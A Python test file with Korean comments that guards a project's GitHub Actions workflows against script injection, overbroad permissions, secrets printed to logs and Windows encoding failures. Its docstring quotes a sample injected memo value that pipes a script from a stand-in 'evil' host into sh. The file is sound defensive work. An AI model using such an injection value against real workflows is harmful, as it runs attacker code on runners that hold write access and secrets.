"""워크플로 스크립트 인젝션 계약 검사.

배경(2026-08-11 감사): deposit.yml이 입금 메모를 run: 블록에 직접 보간했다.

    python -m quant deposit --memo "${{ github.event.inputs.memo }}"

GitHub는 셸보다 **먼저** ${{ }}를 문자열로 갈아끼운다. 그래서 메모에

    "; curl evil.sh | sh; #

같은 값을 넣으면 러너에서 임의 명령이 실행된다 — 그 잡은 contents: write
권한과 디스코드·텔레그램 시크릿을 들고 있다. build-app.yml의 자유 입력
version에도 같은 구멍이 있었다.

env로 전달하면 셸이 값을 '데이터'로만 보므로 안전하다.

핵심 계약: run: 블록 안에서 사용자 제어 값을 ${{ }}로 직접 펼치지 않는다.
"""
from __future__ import annotations

import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

WF = Path(__file__).resolve().parent.parent / ".github" / "workflows"

# 공격자가 값을 정할 수 있는 컨텍스트. secrets·vars·matrix·env는 제외
# (운영자가 정하고, 셸에 값이 아니라 이름으로 들어가는 경우가 대부분).
_USER_CONTROLLED = re.compile(
    r"\$\{\{\s*(?:github\.event\.inputs\.|inputs\.|github\.head_ref"
    r"|github\.ref_name|github\.event\.(?:issue|pull_request|comment|"
    r"discussion|review)\b)")


def _run_blocks(text: str):
    """`run: |` 블록의 본문만 뽑는다(env: 매핑은 제외된다)."""
    for m in re.finditer(r"\n(\s+)run:\s*[|>]?\s*\n((?:(?:\1\s+).*\n|\s*\n)+)",
                         text):
        yield m.group(2)


def test_no_user_input_interpolated_into_shell():
    bad = []
    for path in sorted(WF.glob("*.yml")):
        for block in _run_blocks(path.read_text("utf-8")):
            for m in _USER_CONTROLLED.finditer(block):
                line = block[block.rfind("\n", 0, m.start()) + 1:
                             block.find("\n", m.start())].strip()
                bad.append(f"{path.name}: {line[:100]}")
    assert not bad, (
        "run: 블록에 사용자 제어 값을 직접 펼쳤습니다(스크립트 인젝션). "
        "env:로 전달한 뒤 \"$VAR\"로 쓰세요.\n  " + "\n  ".join(bad))


def test_deposit_passes_inputs_through_env():
    src = (WF / "deposit.yml").read_text("utf-8")
    assert "DEPOSIT_AMOUNT: ${{ github.event.inputs.amount }}" in src
    assert 'python -m quant deposit --amount "$DEPOSIT_AMOUNT"' in src
    assert '--memo "$DEPOSIT_MEMO"' in src


def test_build_version_passes_through_env():
    src = (WF / "build-app.yml").read_text("utf-8")
    assert "IN_VERSION: ${{ github.event.inputs.version }}" in src
    assert 'v="$IN_VERSION"' in src


def test_deposit_amount_is_bounded_in_python():
    """워크플로를 통과해도 파이썬이 다시 막는다(이중 방어)."""
    import pytest

    from quant.live.daily import add_deposit
    for bad in (0, -1, 10_000_001):
        with pytest.raises(ValueError):
            add_deposit(bad)


def test_detector_catches_a_known_bad_pattern():
    """탐지기 자체가 살아 있는가 — 통과만 하는 테스트는 증인이 못 된다."""
    sample = '\n  run: |\n    echo "${{ github.event.inputs.memo }}"\n'
    hits = [m for b in _run_blocks(sample)
            for m in _USER_CONTROLLED.finditer(b)]
    assert hits


# ── 최소 권한 ─────────────────────────────────────────────────
#
# 2026-08-11 감사: ci·report·nightly-validate·weekly-report 네 워크플로가
# permissions를 선언하지 않아 저장소 기본값을 물려받고 있었다. 조직 설정에
# 따라 그 기본값은 write-all일 수 있다 — 테스트만 돌리는 잡이 저장소를
# 쓸 권한을 들고 있을 이유가 없다.


def test_every_workflow_declares_permissions():
    import yaml
    missing = []
    for path in sorted(WF.glob("*.yml")):
        d = yaml.safe_load(path.read_text("utf-8"))
        if "permissions" not in d:
            missing.append(path.name)
    assert not missing, f"권한 미선언(저장소 기본값 상속): {missing}"


def test_read_only_workflows_stay_read_only():
    import yaml
    for name in ("ci.yml", "report.yml", "weekly-report.yml", "deadman.yml"):
        d = yaml.safe_load((WF / name).read_text("utf-8"))
        assert d["permissions"] == {"contents": "read"}, name


def test_no_workflow_prints_a_secret():
    import re
    bad = []
    for path in sorted(WF.glob("*.yml")):
        for i, ln in enumerate(path.read_text("utf-8").splitlines(), 1):
            if re.search(r"(echo|print|cat|tee)[^\n]*\$\{\{\s*secrets\.", ln):
                bad.append(f"{path.name}:{i}")
    assert not bad, f"시크릿을 로그로 출력한다: {bad}"


# ── Windows 콘솔 인코딩 ───────────────────────────────────────
#
# 2026-08-11: v0.17.0 Windows 빌드가 실패했다. 새로 만든 라이선스 검증
# 단계가 확인 메시지에 이모지(🔒)를 찍는데, Windows 콘솔은 cp1252라
# 파이썬이 UnicodeEncodeError로 죽는다. 자물쇠는 정상적으로 구워졌고
# **출력하다** 죽은 것이라 더 억울하다.
#
# 이 프로젝트는 v0.13.1에서 같은 이유로 이미 한 번 깨졌고, 그때 스모크
# 단계에만 PYTHONUTF8을 넣었다. 새 단계는 그걸 물려받지 못했다 —
# 규칙이 사람 기억에만 있으면 다음 단계에서 또 빠진다.


def _windows_workflows():
    import yaml
    out = []
    for path in sorted(WF.glob("*.yml")):
        text = path.read_text("utf-8")
        if "windows-latest" not in text:
            continue
        out.append((path, yaml.safe_load(text)))
    return out


def test_python_steps_on_windows_force_utf8():
    bad = []
    for path, doc in _windows_workflows():
        for job in (doc.get("jobs") or {}).values():
            job_env = job.get("env") or {}
            for step in job.get("steps") or []:
                run = str(step.get("run") or "")
                if "python" not in run:
                    continue
                env = {**job_env, **(step.get("env") or {})}
                if str(env.get("PYTHONUTF8", "")) != "1":
                    bad.append(f"{path.name}: {step.get('name', run[:40])}")
    assert not bad, (
        "Windows에서 파이썬을 돌리는데 PYTHONUTF8=1이 없습니다 — 한글·이모지 "
        "출력이 cp1252로 죽습니다:\n  " + "\n  ".join(bad))


def test_utf8_is_set_at_job_level_not_per_step():
    """단계마다 챙기는 규칙은 다음 단계에서 또 빠진다 — 잡에 건다."""
    import yaml
    doc = yaml.safe_load((WF / "build-app.yml").read_text("utf-8"))
    for name, job in (doc.get("jobs") or {}).items():
        env = job.get("env") or {}
        assert env.get("PYTHONUTF8") == "1", name
        assert env.get("PYTHONIOENCODING") == "utf-8", name
